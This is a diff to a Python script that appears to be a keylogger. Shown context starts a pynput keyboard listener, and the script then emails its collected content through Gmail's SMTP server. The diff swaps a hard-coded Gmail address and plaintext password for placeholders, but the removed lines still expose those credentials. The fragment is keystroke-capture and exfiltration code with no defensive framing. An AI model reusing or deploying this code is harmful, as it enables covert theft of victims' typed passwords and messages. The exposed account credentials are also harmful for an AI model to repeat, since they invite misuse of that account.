@@ -30,8 +30,8 @@ listener = keyboard.Listener(
     on_release=on_release)
 listener.start()
 
-sender_email = "nosystemissafe4321@gmail.com"
-receiver_email = "nosystemissafe4321@gmail.com"
+sender_email = "@gmail.com"
+receiver_email = "@gmail.com"
 message = MIMEMultipart()
 message["From"] = sender_email
 message['To'] = receiver_email
@@ -46,7 +46,7 @@ message.attach(obj)
 my_message = message.as_string()
 email_session = smtplib.SMTP('smtp.gmail.com',587)
 email_session.starttls()
-email_session.login(sender_email,'Anonymous12345677')
+email_session.login(sender_email,'Password')
 email_session.sendmail(sender_email,receiver_email,my_message)
 email_session.quit()
 print("YOUR MAIL HAS BEEN SENT SUCCESSFULLY")
